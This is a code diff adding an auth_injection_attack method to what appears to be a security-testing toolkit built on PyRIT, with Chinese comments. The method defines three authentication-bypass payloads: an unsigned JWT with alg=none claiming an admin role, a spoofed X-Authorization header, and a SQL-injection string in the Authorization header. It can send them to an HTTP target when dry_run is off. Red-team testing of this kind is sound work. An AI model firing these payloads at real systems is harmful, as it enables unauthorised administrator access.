@@ -321,6 +321,74 @@ class AuthAttacks:
             "result": result,
         }
 
+    # === 认证注入攻击 ===
+    def auth_injection_attack(
+        self,
+        *,
+        target: Any | None = None,
+        dry_run: bool = True,
+    ) -> dict[str, Any]:
+        """认证注入攻击（coverage 策略 auth_injection）。
+
+        真实实现：构造针对认证机制的注入 payload（JWT alg=none、认证头注入、
+        X-Authorization 欺骗），并在提供可投递目标且非 dry_run 时经 PyRIT HTTPTarget 实投；
+        dry_run 仅产出 payload（C9 诚实、R-NATIVE 原生优先）。
+
+        Academic basis:
+            - OWASP: JWT Security Best Practices
+            - RFC 7519 Section 6: Unsecured JWTs
+
+        Args:
+            target: 可选 PyRIT HTTPTarget，实投目标
+            dry_run: True 时仅产出 payload（默认）
+
+        Returns:
+            {"attack_type": "认证注入", "seeds": [...], "execution_report": dict|None}
+        """
+        payloads = [
+            {
+                "name": "jwt_alg_none",
+                "header": "Authorization",
+                "value": "Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
+            },
+            {
+                "name": "x_authorization_spoof",
+                "header": "X-Authorization",
+                "value": "Bearer admin",
+            },
+            {
+                "name": "auth_header_injection",
+                "header": "Authorization",
+                "value": "Bearer injected' OR '1'='1",
+            },
+        ]
+        seeds = [
+            {
+                "value": p["value"],
+                "metadata": {
+                    "category": "auth_injection",
+                    "technique": p["name"],
+                    "header": p["header"],
+                    "severity": "high",
+                },
+            }
+            for p in payloads
+        ]
+        produced: dict[str, Any] = {"attack_type": "认证注入", "seeds": seeds, "execution_report": None}
+        if target is not None and not dry_run:
+            try:
+                report: list[dict[str, Any]] = []
+                for p in payloads:
+                    self.http_target.headers[p["header"]] = p["value"]
+                    attack = PromptSendingAttack(objective_target=self.http_target)
+                    result = attack.execute(objective="以管理员身份执行操作")
+                    report.append({"technique": p["name"], "result": str(result)[:300]})
+                produced["execution_report"] = report
+                logger.info("[Chain] auth_injection 实投 %d 个 payload", len(payloads))
+            except Exception as e:  # noqa: BLE001
+                logger.warning("[Chain] auth_injection 实投失败（不影响 payload 产出）: %s", e)
+        return produced
+
     # === 批量认证攻击 ===
     def run_all_auth_attacks(
         self,
